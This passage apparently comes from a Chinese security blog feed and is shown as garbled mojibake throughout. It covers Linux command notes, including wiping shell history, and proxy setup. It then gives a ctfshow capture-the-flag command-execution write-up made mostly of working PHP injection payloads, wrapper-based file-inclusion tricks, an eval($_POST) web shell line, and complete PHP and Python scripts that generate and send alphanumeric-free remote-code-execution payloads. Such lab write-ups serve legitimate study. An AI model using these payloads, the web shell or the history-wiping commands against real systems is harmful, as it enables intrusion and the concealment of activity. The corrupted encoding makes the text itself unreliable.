æŸ¥çœ‹å†å²å‘½ä»¤</p><p>â€‹æ¸…ç©ºå†å²å‘½ä»¤:</p><p>â€‹bash: history -c</p><p>â€‹zsh: rm -rf &#x2F;root&#x2F;.zsh_historyï¼ˆ<em>kali</em> é»˜è®¤çš„ shell <em>ç¯å¢ƒ</em>å·²ç»ä» bash æ›´æ”¹ä¸º zshï¼‰<strong>æ‰§è¡Œå®Œä¹‹åè¦é‡æ–°ç™»å½•æ‰èƒ½ç”Ÿæ•ˆ</strong></p><h4 id="3ã€æ—¶é—´æ—¥æœŸç±»"><a href="#3ã€æ—¶é—´æ—¥æœŸç±»" class="headerlink" title="3ã€æ—¶é—´æ—¥æœŸç±»"></a>3ã€æ—¶é—´æ—¥æœŸç±»</h4><p>â€‹date æŸ¥çœ‹å½“å¤©æ—¥æœŸ</p><p>â€‹cal æŸ¥çœ‹æ—¥å†</p><h4 id="4ã€ç”¨æˆ·ç®¡ç†å‘½ä»¤"><a href="#4ã€ç”¨æˆ·ç®¡ç†å‘½ä»¤" class="headerlink" title="4ã€ç”¨æˆ·ç®¡ç†å‘½ä»¤"></a>4ã€ç”¨æˆ·ç®¡ç†å‘½ä»¤</h4><p>â€‹ï¼ˆ1ï¼‰useradd æ·»åŠ æ–°ç”¨æˆ·</p><p>â€‹useradd ç”¨æˆ·åï¼ˆæ·»åŠ æ–°ç”¨æˆ·ï¼‰</p><p>â€‹useradd  -g  ç»„å  ç”¨æˆ·åï¼ˆæ·»åŠ æ–°ç”¨æˆ·åˆ°æŸä¸ªç»„ï¼‰</p><p>â€‹ï¼ˆ2ï¼‰passwd è®¾ç½®ç”¨æˆ·å¯†ç </p><p>â€‹password ç”¨æˆ·å</p><p>â€‹ï¼ˆ3ï¼‰id æŸ¥çœ‹ç”¨æˆ·æ˜¯å¦å­˜åœ¨</p><p>â€‹ï¼ˆ4ï¼‰cat  &#x2F;etc&#x2F;password  æŸ¥çœ‹ç³»ç»Ÿä¸­çš„ç”¨æˆ·ä¿¡æ¯</p><p>â€‹ï¼ˆ5ï¼‰su åˆ‡æ¢ç”¨æˆ·</p><p>â€‹ï¼ˆ6ï¼‰who æŸ¥çœ‹ç™»å½•ç”¨æˆ·ä¿¡æ¯</p><p>â€‹whoami  æŸ¥çœ‹å½“å‰ç™»å½•ç”¨æˆ·ä¿¡æ¯</p><p>â€‹who am i  æŸ¥çœ‹åŸå§‹ç™»å½•ç”¨æˆ·ï¼ˆæœ‰ç©ºæ ¼ï¼‰</p><p>â€‹ï¼ˆ7ï¼‰</p><h4 id="5ã€ç«¯å£å‘½ä»¤"><a href="#5ã€ç«¯å£å‘½ä»¤" class="headerlink" title="5ã€ç«¯å£å‘½ä»¤"></a>5ã€ç«¯å£å‘½ä»¤</h4><pre><code>netstat -tunlp | grep ç«¯å£å·</code></pre><p>-tunlpçš„å«ä¹‰ï¼š</p><ul><li>-t (tcp) ä»…æ˜¾ç¤ºtcpç›¸å…³é€‰é¡¹</li><li>-u (udp)ä»…æ˜¾ç¤ºudpç›¸å…³é€‰é¡¹</li><li>-n æ‹’ç»æ˜¾ç¤ºåˆ«åï¼Œèƒ½æ˜¾ç¤ºæ•°å­—çš„å…¨éƒ¨è½¬åŒ–ä¸ºæ•°å­—</li><li>-l ä»…åˆ—å‡ºåœ¨Listen(ç›‘å¬)çš„æœåŠ¡çŠ¶æ€</li><li>-p æ˜¾ç¤ºå»ºç«‹ç›¸å…³é“¾æ¥çš„ç¨‹åºå</li></ul><p>æ¯”å¦‚æŸ¥çœ‹22ç«¯å£çš„æƒ…å†µ</p><p>â€‹netstat -tunlp |grep 22</p><p>æ€æ­»ç«¯å£</p><pre><code>kill -9 PID</code></pre><p>ä¾‹å¦‚æ€æ­»PIDä¸º2956çš„ç«¯å£ï¼š</p><p>kill -9 2956</p><h4 id="6ã€æŸ¥æ‰¾å‘½ä»¤"><a href="#6ã€æŸ¥æ‰¾å‘½ä»¤" class="headerlink" title="6ã€æŸ¥æ‰¾å‘½ä»¤"></a>6ã€æŸ¥æ‰¾å‘½ä»¤</h4><h5 id="findå‘½ä»¤"><a href="#findå‘½ä»¤" class="headerlink" title="findå‘½ä»¤"></a>findå‘½ä»¤</h5><pre><code>find &lt; path &gt; &lt; expression &gt; &lt; cmd &gt;&#39;&#39;&#39;pathï¼š æ‰€è¦æœç´¢çš„ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚é»˜è®¤ä¸ºå½“å‰ç›®å½•ã€‚expressionï¼š æ‰€è¦æœç´¢çš„æ–‡ä»¶çš„ç‰¹å¾ã€‚cmdï¼š å¯¹æœç´¢ç»“æœè¿›è¡Œç‰¹å®šçš„å¤„ç†ã€‚å¦‚æœä»€ä¹ˆå‚æ•°ä¹Ÿä¸åŠ ï¼Œfindé»˜è®¤æœç´¢å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ï¼Œå¹¶ä¸”ä¸è¿‡æ»¤ä»»ä½•ç»“æœï¼ˆä¹Ÿå°±æ˜¯è¿”å›æ‰€æœ‰æ–‡ä»¶ï¼‰ï¼Œå°†å®ƒä»¬å…¨éƒ½æ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚&#39;&#39;&#39;</code></pre><p>ä¾‹ï¼š</p><p>-name æŒ‰ç…§æ–‡ä»¶åæŸ¥æ‰¾æ–‡ä»¶ã€‚</p><pre><code># åœ¨/dirç›®å½•åŠå…¶å­ç›®å½•ä¸‹é¢æŸ¥æ‰¾åå­—ä¸ºfilenameçš„æ–‡ä»¶find /dir -name filename # åœ¨å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ï¼ˆç”¨â€œ.â€è¡¨ç¤ºï¼‰ä¸­æŸ¥æ‰¾ä»»ä½•æ‰©å±•åä¸ºâ€œcâ€çš„æ–‡ä»¶find . -name &quot;*.c&quot; </code></pre><h4 id="7ã€é…ç½®å…¨å±€ç½‘ç»œä»£ç†"><a href="#7ã€é…ç½®å…¨å±€ç½‘ç»œä»£ç†" class="headerlink" title="7ã€é…ç½®å…¨å±€ç½‘ç»œä»£ç†"></a>7ã€é…ç½®å…¨å±€ç½‘ç»œä»£ç†</h4><p>ä»¥ä¸‹éƒ½éœ€è¦åœ¨clashå…¨å±€æ¨¡å¼(global)ä¸‹</p><p>ï¼ˆ1ï¼‰è™šæ‹Ÿæœºä½¿ç”¨netç½‘ç»œæ¨¡å¼</p><p>â€‹ç›´æ¥åœ¨ä¸»æœºclashä¸Šå¼€å¯TUNæ¨¡å¼å’Œæ··åˆé…ç½®(mixin)ï¼ˆé˜²æ­¢å†²çªå…³é—­systemproxyç³»ç»Ÿä»£ç†ï¼‰</p><p>{ % asset_img 232556%}</p><p>æŒ‰ç…§ä¸Šé¢ä¸‰æ­¥ä¾æ¬¡æ‰§è¡Œï¼Œæœ€åç‚¹å¼€mixiné€‰é¡¹ï¼Œç¼–è¾‘æ–‡ä»¶ï¼Œåˆ é™¤é‡Œé¢çš„å†…å®¹ï¼Œç²˜è´´ä¸Šä¸‹é¢çš„å†…å®¹å³å¯ï¼</p><pre><code>mixin:   hosts:     &#39;mtalk.google.com&#39;: 108.177.125.188     &#39;services.googleapis.cn&#39;: 74.125.203.94     &#39;raw.githubusercontent.com&#39;: 151.101.76.133   dns:     enable: true     default-nameserver:       - 223.5.5.5   # é˜¿é‡Œçš„DNSæœåŠ¡å™¨       - 1.0.0.1     # CloudFlareçš„DNSæœåŠ¡å™¨     ipv6: false     enhanced-mode: redir-host #fake-ip     nameserver:       - https://dns.rubyfish.cn/dns-query       - https://223.5.5.5/dns-query       - https://dns.pub/dns-query     fallback:       - https://1.0.0.1/dns-query       - https://public.dns.iij.jp/dns-query       - https://dns.twnic.tw/dns-query     fallback-filter:       geoip: true       ipcidr:         - 240.0.0.0/4         - 0.0.0.0/32         - 127.0.0.1/32       domain:         - +.google.com         - +.facebook.com         - +.twitter.com         - +.youtube.com         - +.xn--ngstr-lra8j.com         - +.google.cn         - +.googleapis.cn         - +.gvt1.com   tun:     enable: true     stack: gvisor     dns-hijack:       - 198.18.0.2:53     macOS-auto-route: true     macOS-auto-detect-interface: true # è‡ªåŠ¨æ£€æµ‹å‡ºå£ç½‘å¡</code></pre><p>ï¼ˆ2ï¼‰è™šæ‹Ÿæœºä½¿ç”¨æ¡¥æ¥æ¨¡å¼</p><p>â€‹&lt;1&gt;clashå¼€å¯ç³»ç»Ÿä»£ç†(systemproxy)</p><p>â€‹ &lt;2&gt;linuxè¿›å…¥&#x2F;etc&#x2F;profile.dç›®å½•ï¼Œæ–°å»ºproxy.shï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><pre><code>export proxy=&quot;http://192.168.150.1:7890&quot;export http_proxy=$proxyexport https_proxy=$proxyexport HTTP_PROXY=$proxyexport HTTPS_PROXY=$proxyexport all_proxy=socks5://192.168.10.103:7890</code></pre><p>â€‹&lt;3&gt;æ‰§è¡Œè„šæœ¬æ–‡ä»¶</p><pre><code>sourch proxy.sh</code></pre><p>â€‹&lt;4&gt;é…ç½®githubç½‘ç»œä»£ç†</p><pre><code>git config --global http.https://github.com.proxy socks5://192.168.150.1:7890</code></pre><p>â€‹&lt;5&gt;æ£€æŸ¥ä»£ç†</p><pre><code>curl cip.cc</code></pre><p>â€‹&lt;6&gt;æµè§ˆå™¨ä»£ç†éœ€è¦å•ç‹¬é…ç½®ï¼Œchromeå¯ä»¥ç”¨ä»£ç†æ’ä»¶</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‘½ä»¤æ‰§è¡Œ(ctfshow)</title>
      <link href="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/"/>
      <url>/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h1><h2 id="ç±»å‹ä¸€-å˜é‡cæ¥æ¥å—å¹¶è¿‡æ»¤ä¼ å…¥çš„æ•°æ®-evalå‡½æ•°æ¥æ‰§è¡Œ"><a href="#ç±»å‹ä¸€-å˜é‡cæ¥æ¥å—å¹¶è¿‡æ»¤ä¼ å…¥çš„æ•°æ®-evalå‡½æ•°æ¥æ‰§è¡Œ" class="headerlink" title="ç±»å‹ä¸€:å˜é‡cæ¥æ¥å—å¹¶è¿‡æ»¤ä¼ å…¥çš„æ•°æ®,evalå‡½æ•°æ¥æ‰§è¡Œ"></a>ç±»å‹ä¸€:å˜é‡cæ¥æ¥å—å¹¶è¿‡æ»¤ä¼ å…¥çš„æ•°æ®,evalå‡½æ•°æ¥æ‰§è¡Œ</h2><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><p>ä½¿ç”¨é€šé…ç¬¦*æˆ–?æˆ–â€™â€™ç­‰ç­‰ç»•è¿‡flag</p><pre><code>payload 1.c=system(&quot;cat f*&quot;);2.c=echo `cat f*`;3.c=echo `nl fl&#39;&#39;ag.php`;æˆ–c=echo `nl fl&quot;&quot;ag.php`;//nlå‘½ä»¤åœ¨linuxç³»ç»Ÿä¸­ç”¨æ¥è®¡ç®—æ–‡ä»¶ä¸­è¡Œå·ã€‚nl å¯ä»¥å°†è¾“å‡ºçš„æ–‡ä»¶å†…å®¹è‡ªåŠ¨çš„åŠ ä¸Šè¡Œå·4.c=echo `nl fl\ag.php`;   //è½¬ä¹‰å­—ç¬¦ç»•è¿‡5.c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php //é€šè¿‡å˜é‡èµ‹å€¼ç›´æ¥ç»•è¿‡cçš„è¿‡æ»¤?ip=127.0.0.1;cat `ls` //å†…è”æ‰§è¡Œï¼Œå°±æ˜¯å°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œcp fla&#123;g.php,G&#125;    //æŠŠflag.phpå¤åˆ¶ä¸ºflaG</code></pre><p>å¯ä»¥è¯»å–æ–‡ä»¶çš„å‡½æ•°ï¼š</p><pre><code>readfile()è¯»å–æ–‡ä»¶ highlight_file()è¯»æ–‡ä»¶ show_source()åŒä¸Š base64_decode()base64è§£ç  strrev()åè½¬å­—ç¬¦ä¸²include()æ–‡ä»¶åŒ…å«ï¼Œå¯ä»¥ä¸ä½¿ç”¨æ‹¬å·require()å®Œå…¨å¯ä»¥æ›¿ä»£include()</code></pre><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><pre><code>payload ?c=echo `cat f*`;</code></pre><p>å…¶ä»–å¯ä»£æ›¿systemå‡½æ•°ï¼š</p><pre><code>system()passthru() exec() shell_exec() popen() proc_open()pcntl_exec() åå¼•å· åŒshell_exec()</code></pre><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><pre><code>payload c=echo%09`tac%09f*`;</code></pre><p>æ–‡ä»¶è¯»å–å‘½ä»¤</p><pre><code>more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹less:ä¸ more ç±»ä¼¼ head:æŸ¥çœ‹å¤´å‡ è¡Œtac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯cat çš„åå‘æ˜¾ç¤ºtail:æŸ¥çœ‹å°¾å‡ è¡Œnl:æ˜¾ç¤ºå†…å®¹ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹sort:æ–‡ä»¶æ’åºå¹¶è¾“å‡ºä¹Ÿå¯ä»¥æŸ¥çœ‹å†…å®¹uniq:å¯ä»¥æŸ¥çœ‹ file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹grepgrep &#123; flag.phpæ‰“å°æœ‰â€&#123;â€œçš„ä¸€è¡Œstrings: åœ¨å¯¹è±¡æ–‡ä»¶æˆ–äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æŸ¥æ‰¾å¯æ‰“å°çš„å­—ç¬¦ä¸², åœ¨å½“å‰ç›®å½•ä¸­ï¼ŒæŸ¥æ‰¾åç¼€æœ‰ file å­—æ ·çš„æ–‡ä»¶ä¸­åŒ…å« test å­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼Œå¹¶æ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²çš„è¡Œã€‚æ­¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š grep test *file stringsã€‚é€šå¸¸ç”¨æ³•ï¼šstrings\$IFS\$9f*(å¿…é¡»åŠ è½¬ä¹‰å­—ç¬¦)pasteæŠŠæ¯ä¸ªæ–‡ä»¶ä»¥åˆ—å¯¹åˆ—çš„æ–¹å¼ï¼Œä¸€åˆ—åˆ—åœ°åŠ ä»¥åˆå¹¶sedä¸€ç§ç¼–è¾‘å™¨ï¼Œå¯ä»¥ç”¨sed -f flag.phpè¯»å–flagawkcurlcut</code></pre><p>linuxç»•è¿‡ç©ºæ ¼</p><pre><code>cat%09flag  //tab&#123;cat,flag.txt&#125; cat$&#123;IFS&#125;$9flag.txt  //$IFSåœ¨linuxä¸‹è¡¨ç¤ºä¸ºç©ºæ ¼cat&#123;IFS&#125;flag.txtcat$IFSflag.txtcat$&#123;IFS&#125;flag.txtcat$IFS$1flag.txt //$1æ”¹æˆ$åŠ å…¶ä»–æ•°å­—éƒ½è¡ŒcatIFSflag.txtcat&lt;flag.txt cat&lt;&gt;flag.txt ca\t fl\ag</code></pre><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><pre><code>payload 1.c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&quot;ls&quot;);?&gt;         2.c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php        3.c=require$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></pre><p>includeå¯ä»¥ä¸ç”¨æ‹¬å·,åˆ†å·ç”¨?&gt;ä»£æ›¿</p><h3 id="web33-36"><a href="#web33-36" class="headerlink" title="web33-36"></a>web33-36</h3><p>è¿™å››å…³éƒ½å¯ä»¥å‰é¢çš„payloadï¼Œ36å…³åªéœ€æŠŠ1æ¢æˆaå°±è¡Œäº†</p><pre><code>payload 1.c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php        2.c=require$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></pre><p>phpæ€»æ¯”è¾ƒå¸¸ç”¨çš„å¯ä»¥ä¸åŠ æ‹¬å·çš„å‡½æ•°æœ‰:</p><pre><code>`echo`ã€`print`ã€`isset`ã€`unset`ã€`include`ã€`require`</code></pre><h2 id="ç±»å‹äºŒ-å˜é‡cæ¥æ”¶å¹¶è¿‡æ»¤ä¼ å…¥çš„æ•°æ®-includeæ¥åŒ…å«æ–‡ä»¶"><a href="#ç±»å‹äºŒ-å˜é‡cæ¥æ”¶å¹¶è¿‡æ»¤ä¼ å…¥çš„æ•°æ®-includeæ¥åŒ…å«æ–‡ä»¶" class="headerlink" title="ç±»å‹äºŒ:å˜é‡cæ¥æ”¶å¹¶è¿‡æ»¤ä¼ å…¥çš„æ•°æ®,includeæ¥åŒ…å«æ–‡ä»¶"></a>ç±»å‹äºŒ:å˜é‡cæ¥æ”¶å¹¶è¿‡æ»¤ä¼ å…¥çš„æ•°æ®,includeæ¥åŒ…å«æ–‡ä»¶</h2><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><p>è¿™å…³è¦ç”¨åˆ°phpä¼ªåè®®data:&#x2F;&#x2F;</p><pre><code>payload ?c=data://text/plain,&lt;?php system(&quot;cat f*&quot;);?&gt;        ?c=data:,&lt;?php @eval($_POST[&#39;shell&#39;]); ?&gt;  //å¯ä»¥ç›´æ¥ç”¨èšå‰‘è¿æ¥</code></pre><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><p>è¿‡æ»¤äº†phpå’Œfileï¼Œå¯ä»¥ç”¨&lt;?&#x3D;æˆ–è¿›è¡Œbase64ç¼–ç </p><pre><code>payload c=data://text/plain,&lt;?=system(&quot;cat f*&quot;);?&gt;        c=data:text/base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhKiIpOw==</code></pre><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><pre><code>payload c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;);?&gt;</code></pre><p>.php å› ä¸ºå‰é¢çš„phpè¯­å¥å·²ç»é—­åˆäº†ï¼Œæ‰€ä»¥åé¢çš„.phpä¼šè¢«å½“æˆhtmlé¡µé¢ç›´æ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œèµ·ä¸åˆ°ä»€ä¹ˆä½œç”¨</p><h3 id="web40-å±äºç±»å‹ä¸€"><a href="#web40-å±äºç±»å‹ä¸€" class="headerlink" title="web40  å±äºç±»å‹ä¸€"></a>web40  å±äºç±»å‹ä¸€</h3><p>æ­¤é¢˜è€ƒå¯Ÿæ— å‚æ•°å‡½æ•°æ„é€ ï¼Œå‚è€ƒå¤§ä½¬ä»¬å†™çš„ï¼š</p><p>å‡½æ•°ï¼šprint_r(scandir(â€˜.â€™))å¯ä»¥ç”¨æ¥æŸ¥çœ‹å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶åï¼Œæˆ‘ä»¬è¦åšçš„æ˜¯å°†æ‹¬å·ä¸­çš„.æ›¿æ¢æ‰</p><p>localeconv()å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ï¼Œå¦‚ä¸‹åªæ˜¯è¯¥å‡½æ•°çš„ä¸€éƒ¨åˆ†æ•°ç»„å…ƒç´ </p><img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/44337.png" class=""><p>å¯åˆ©ç”¨localeconv()å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå°æ•°ç‚¹ä»£æ›¿è¯»å–ç›®å½•å‡½æ•°print_r(scandir(â€˜.â€™))ä¸­çš„å‚æ•° .<br>é‚£ä¹ˆå¦‚ä½•å°†æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ è¯»å–å‡ºæ¥å‘¢ï¼Ÿå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡½æ•°ï¼š</p><pre><code>current()å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ /å•å…ƒï¼Œé»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ï¼› pos()å‡½æ•°åŒä¸Šï¼Œæ˜¯current()å‡½æ•°çš„åˆ«åï¼› reset()å‡½æ•°ï¼Œå½“æ•°ç»„ä¸ä¸ºç©ºæ—¶è¿”å›æ•°ç»„ç¬¬ä¸€ä¸ªå•å…ƒçš„å€¼ï¼Œå¦‚æœæ•°ç»„ä¸ºç©ºåˆ™è¿”å›FALSE</code></pre><p>å¯ä»¥å¾—åˆ°flag.phpä½äºæ•°ç»„çš„ç¬¬ä¸‰ä¸ªå€¼é‡Œï¼Œä¹Ÿå°±æ˜¯å€’æ•°ç¬¬äºŒä¸ªï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡array_reverse()å‡½æ•°ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„ï¼Œåœ¨ç”¨next()å‡½æ•°è¯»å–ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œæœ€åé€šè¿‡highlight_file()å‡½æ•°è¯»å–åˆ°flag.php</p><pre><code>payload â‘ ?c=print_r(scandir(pos(localeconv())));        â‘¡?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code></pre><p>æ›´å¤šæ“ä½œå‚è€ƒ<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><h3 id="web41-å±äºç±»å‹ä¸€"><a href="#web41-å±äºç±»å‹ä¸€" class="headerlink" title="web41 å±äºç±»å‹ä¸€"></a>web41 å±äºç±»å‹ä¸€</h3><p>è¿™å…³æ˜¯æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ</p><p>pç¥åŸè¯ï¼šåœ¨PHPä¸­ï¼Œä¸¤ä¸ªå­—ç¬¦ä¸²æ‰§è¡Œå¼‚æˆ–æ“ä½œä»¥åï¼Œå¾—åˆ°çš„è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬æƒ³å¾—åˆ°a-zä¸­æŸä¸ªå­—æ¯ï¼Œå°±æ‰¾åˆ°æŸä¸¤ä¸ªéå­—æ¯ã€æ•°å­—çš„å­—ç¬¦ï¼Œä»–ä»¬çš„å¼‚æˆ–ç»“æœæ˜¯è¿™ä¸ªå­—æ¯å³å¯ã€‚</p><p>ä»¥ä¸‹å‚è€ƒ<a href="https://blog.csdn.net/Sapphire037/article/details/121054836">https://blog.csdn.net/Sapphire037/article/details/121054836</a></p><p>é€šè¿‡ä»£ç å®¡è®¡æˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™ä¸ªé¢˜è¿‡æ»¤äº†$ã€+ã€-ã€^ã€~ä½¿å¾—å¼‚æˆ–è‡ªå¢å’Œå–åæ„é€ å­—ç¬¦éƒ½æ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯ç•™äº†ä¸€ä¸ª<code>|</code>ä¹Ÿå°±æ˜¯æˆ–è¿ç®—è¿˜å¯ä»¥ç”¨ï¼Œè¿™ä¸ªæ—¶å€™åˆ©ç”¨Y4å¸ˆå‚…å’Œç¾½å¸ˆå‚…çš„è„šæœ¬ç»“åˆï¼Œå³å¯å¾ˆæ–¹ä¾¿çš„åšå‡ºæ¥è¿™é¢˜ã€‚å…ˆçœ‹Y4å¸ˆå‚…çš„è„šæœ¬</p><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*-# @Author: Y4tacker# @Date:   2020-11-21 20:31:22*///æˆ–function orRce($par1, $par2)&#123;    $result = (urldecode($par1)|urldecode($par2));    return $result;&#125;//å¼‚æˆ–function xorRce($par1, $par2)&#123;    $result = (urldecode($par1)^urldecode($par2));    return $result;&#125;//å–åfunction negateRce()&#123;    fwrite(STDOUT,&#39;[+]your function: &#39;);    $system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN));    fwrite(STDOUT,&#39;[+]your command: &#39;);    $command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN));    echo &#39;[*] (~&#39;.urlencode(~$system).&#39;)(~&#39;.urlencode(~$command).&#39;);&#39;;&#125;//mode=1ä»£è¡¨æˆ–ï¼Œ2ä»£è¡¨å¼‚æˆ–ï¼Œ3ä»£è¡¨å–å//å–åçš„è¯ï¼Œå°±æ²¡å¿…è¦ç”Ÿæˆå­—ç¬¦å»è·‘äº†ï¼Œå› ä¸ºæœ¬æ¥å°±æ˜¯ä¸å¯è§å­—ç¬¦ï¼Œç›´æ¥ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼function generate($mode, $preg=&#39;/[0-9]/i&#39;)&#123;    if ($mode!=3)&#123;        $myfile = fopen(&quot;rce.txt&quot;, &quot;w&quot;);        $contents = &quot;&quot;;        for ($i=0;$i&lt;256;$i++)&#123;            for ($j=0;$j&lt;256;$j++)&#123;                if ($i&lt;16)&#123;                    $hex_i = &#39;0&#39;.dechex($i);                &#125;else&#123;                    $hex_i = dechex($i);                &#125;                if ($j&lt;16)&#123;                    $hex_j = &#39;0&#39;.dechex($j);                &#125;else&#123;                    $hex_j = dechex($j);                &#125;                if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;                    echo &quot;&quot;;                &#125;else&#123;                    $par1 = &quot;%&quot;.$hex_i;                    $par2 = &#39;%&#39;.$hex_j;                    $res = &#39;&#39;;                    if ($mode==1)&#123;                        $res = orRce($par1, $par2);                    &#125;else if ($mode==2)&#123;                        $res = xorRce($par1, $par2);                    &#125;                    if (ord($res)&gt;=32&amp;ord($res)&lt;=126)&#123;                        $contents=$contents.$res.&quot; &quot;.$par1.&quot; &quot;.$par2.&quot;\n&quot;;                    &#125;                &#125;            &#125;        &#125;        fwrite($myfile,$contents);        fclose($myfile);    &#125;else&#123;        negateRce();    &#125;&#125;generate(1,&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#39;);//1ä»£è¡¨æ¨¡å¼ï¼Œåé¢çš„æ˜¯è¿‡æ»¤è§„åˆ™</code></pre><p>å†åˆ©ç”¨ç¾½å¸ˆå‚…çš„è„šæœ¬</p><pre><code class="python"># -*- coding: utf-8 -*-import requestsimport urllibfrom sys import *import osos.system(&quot;php D:\\phpstudy_pro\\WWW\\rce.php&quot;)  # æ²¡æœ‰å°†phpå†™å…¥ç¯å¢ƒå˜é‡éœ€æ‰‹åŠ¨è¿è¡Œif (len(argv) != 2):    print(&quot;=&quot; * 50)    print(&#39;USERï¼špython exp.py &lt;url&gt;&#39;)    print(&quot;egï¼š  python exp.py http://ctf.show/&quot;)    print(&quot;=&quot; * 50)    exit(0)url = argv[1]def action(arg):    s1 = &quot;&quot;    s2 = &quot;&quot;    for i in arg:        f = open(r&quot;D:\phpstudy_pro\WWW\rce.txt&quot;, &quot;r&quot;)//å¡«txtçš„æ–‡ä»¶ä½ç½®        while True:            t = f.readline()            if t == &quot;&quot;:                break            if t[0] == i:                # print(i)                s1 += t[2:5]                s2 += t[6:9]                break        f.close()    output = &quot;(\&quot;&quot; + s1 + &quot;\&quot;|\&quot;&quot; + s2 + &quot;\&quot;)&quot;    return (output)while True:    param = action(input(&quot;\n[+] your functionï¼š&quot;)) + action(input(&quot;[+] your commandï¼š&quot;))    data = &#123;        &#39;c&#39;: urllib.parse.unquote(param)    &#125;    r = requests.post(url, data=data)    print(&quot;\n[*] result:\n&quot; + r.text)</code></pre><p>ä¸Šé¢å°±æ³¨æ„ä¸‹phpè„šæœ¬çš„ä½ç½®å’Œç”Ÿæˆçš„rce.txtçš„ä½ç½®è¿˜æœ‰æ¥å—çš„å‚æ•°æ¯”å¦‚ä¸Šé¢æ˜¯cï¼Œæ¢ä¸ªå‚æ•°å°±æŠŠcæ”¹äº†å°±è¡Œ</p><p>é‚£ä¹ˆå®Œæ•´æµç¨‹å°±æ˜¯</p><pre><code>1.å…ˆæ”¹ä¸€ä¸‹phpè„šæœ¬ä¸­generateå‡½æ•°é‡Œçš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯è®¾ç½®æ¨¡å¼å’Œæ­£åˆ™2.python rce_.py url</code></pre><p>å¯ä»¥çœ‹çœ‹pç¥çš„åšå®¢</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">æ— 